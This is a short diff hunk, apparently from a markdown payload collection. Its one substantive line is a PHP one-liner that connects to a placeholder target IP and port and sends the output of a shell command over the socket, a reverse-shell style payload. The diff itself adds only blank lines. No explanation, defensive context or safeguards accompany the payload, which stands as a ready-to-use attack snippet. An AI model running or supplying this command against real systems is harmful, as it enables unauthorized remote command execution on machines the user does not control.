@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 ```bash
 php -r '$sock=fsockopen("$_TARGET_IP",$_TARGET_PORT); fputs($sock, shell_exec('cmd'));'
 ```
+
+
